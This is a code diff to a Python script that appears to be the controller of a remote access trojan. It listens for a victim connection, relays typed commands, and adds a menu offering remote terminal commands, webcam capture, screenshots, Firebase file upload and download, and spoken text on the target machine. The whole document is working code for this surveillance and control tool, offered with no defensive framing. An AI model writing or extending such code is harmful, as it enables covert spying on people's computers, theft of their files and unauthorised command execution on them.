@@ -1,20 +1,17 @@
-
+import os
 import socket
 
 from colorama import Fore, Back, Style
 import time
 dog=(Fore.RED+"""
-
-
 ███████╗███████╗██╗   ██╗███████╗
 ╚══███╔╝██╔════╝██║   ██║██╔════╝
   ███╔╝ █████╗  ██║   ██║███████╗
  ███╔╝  ██╔══╝  ██║   ██║╚════██║
 ███████╗███████╗╚██████╔╝███████║
 ╚══════╝╚══════╝ ╚═════╝ ╚══════╝
-
-
 """)
+os.system('cls')
 print(Fore.RED+dog)
 
 
@@ -27,6 +24,17 @@ conn,addr=sock.accept()
 
 print(Fore.GREEN+"Got connection from {}".format(addr[0]))
 
+def printFunction():
+    print('''Commands Available
+1. display #displays all the commands
+2. run <terminal command> #runs terminal command 
+3. capture #capture picture through webcam
+4. screen capture #screenshot
+5. upload <filename> #uploads the file to firebase 
+6. download <filename> #downloads file from firebase
+7. say <text> #text will be spoken
+8. bitch
+    ''')
 
 
 def get_output():
@@ -46,11 +54,12 @@ while True:
         sock.close()
         break
     elif inp=="clear":
-        print("""\n"""*100)
+        os.system('clear')
         print(dog)
         print(Fore.GREEN)
+    elif inp=="display":
+        printFunction()
+        print(Fore.GREEN)
     else:
-
-
-            conn.send(inp.encode())
-            output=get_output()
+        conn.send(inp.encode())
+        output=get_output()
